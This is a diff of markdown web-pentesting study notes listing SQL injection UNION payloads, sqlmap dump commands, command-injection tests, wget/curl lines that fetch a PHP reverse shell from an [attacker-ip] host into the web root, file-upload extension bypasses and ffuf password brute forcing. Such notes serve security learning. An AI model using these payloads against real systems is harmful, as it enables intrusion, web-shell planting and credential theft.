@@ -868,8 +868,8 @@ Example injections:
   - Can only select the same amount of items as in the original request
 - `' UNION SELECT null,int(null),int(null)`
 - `' UNION SELECT null,null,version()#`
-- `' UNION SELECT null,null,table_name FROM information_schema.tables#`
-- `' UNION SELECT null,null,column_name FROM information_schema.columns#`
+- `' UNION SELECT table_name,null,null FROM information_schema.tables#`
+- `' UNION SELECT null,column_name,null FROM information_schema.columns#`
 - `' UNION SELECT null,null,[column] FROM [table]`
 
 
@@ -887,7 +887,7 @@ Can ask True/False questions if no date is being outputted. Use `substring()` or
 
 sqlmap injecting in cookies:
 - `sqlmap -r [request].txt --level=2`
-- `sqlmap -r [request].txt --level=2 --dump` for dumping data in tables
+- `sqlmap -r [request].txt --level=2 --dump` for dumping data in tables#
 - `sqlmap -r [request].txt --level=2 --dump -T [table]`
 
 ### XXS (Cross Site Scripting)
@@ -924,12 +924,30 @@ Exfiltrating data:
 
 ### Command injection
 
-Inject bash, php, python, etc. through an input.
-- `http://tcm-sec.com; whoami; asd`
+Test for injection:
+- `; whoami; asd`
 - `http://[url]/?'[command]'`
+
+Test for out-of-bound injection:
+- ``http://[ip]:[port]/?`whoami` ``
+
+Try to escape quotes:
+- `'; whoami #`
+
+Reverse shell:
+- Get shell commands from: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+- Check what is running
+  - `which php`
+  - `which bash`
+  - `which python`
+
+Get a shell
+- `cp /usr/share/webshells/laudanum/php/php-reverse-shell.php ~`
+- `nano php-reverse-shell.php`
 - Host a python webserver on port `[port]`
-  - `https://tcm-sec.com \n wget [attacker-ip]:[port]/[filename].php`
-  - `https://tcm-sec.com && curl [attacker-ip]:[port]/[filename].php > /var/www/html/[filename].php`
+  - `\n wget [attacker-ip]:[port]/[filename]`
+  - `&& curl [attacker-ip]:[port]/[filename] > /var/www/html/[filename].php`
+    - Navigate to the file location on the webapp.
 
 ### Insecure file upload
 
@@ -949,12 +967,17 @@ Upload accepted file type
     - Insert payload in the png file content and change the file extension to `.php`
   - Try to bypass the file extension blocklist by using `.php5`, `.phtml,` etc
 
+For a shell:
+- Input the contents of `/usr/share/webshells/laudanum/php/php-reverse-shell.php` into the file upload
+
+When receiving errors while uploading, using a different image may help.
+
 ### Attacking Authentication
 
 *Good source:* https://appsecexplained.gitbook.io/appsecexplained
 
 Brute force with ffuf
-- `mousepad bruteforce.txt` (Put `FUZZ` where the password must go)
+- `nano bruteforce.txt` (Put `FUZZ` where the password must go)
 - `ffuf -request bruteforce.txt -request-proto http -w /usr/share/seclists/Passwords/cato-net-10-million-passwords-10000.txt`
 - `ffuf -request bruteforce.txt -request-proto http -w /usr/share/seclists/Passwords/cato-net-10-million-passwords-10000.txt -fs [failed response length]`
 
